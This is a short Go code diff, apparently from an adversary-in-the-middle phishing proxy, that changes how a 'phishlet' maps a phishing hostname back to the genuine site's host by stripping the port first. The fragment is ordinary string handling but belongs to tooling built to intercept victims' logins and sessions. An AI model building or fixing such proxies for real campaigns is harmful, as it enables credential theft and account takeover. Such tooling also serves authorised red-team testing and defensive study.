@@ -28,7 +28,7 @@ func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 }
 
 func resolveOrigHost(p *aitm.Phishlet, phishHost string) string {
-	lowerPhishHost := strings.ToLower(phishHost)
+	lowerPhishHost := strings.ToLower(hostWithoutPort(phishHost))
 	for i := range p.ProxyHosts {
 		phishFQDN := strings.ToLower(p.ProxyHosts[i].PhishSubdomain + "." + p.BaseDomain)
 		if lowerPhishHost == phishFQDN {
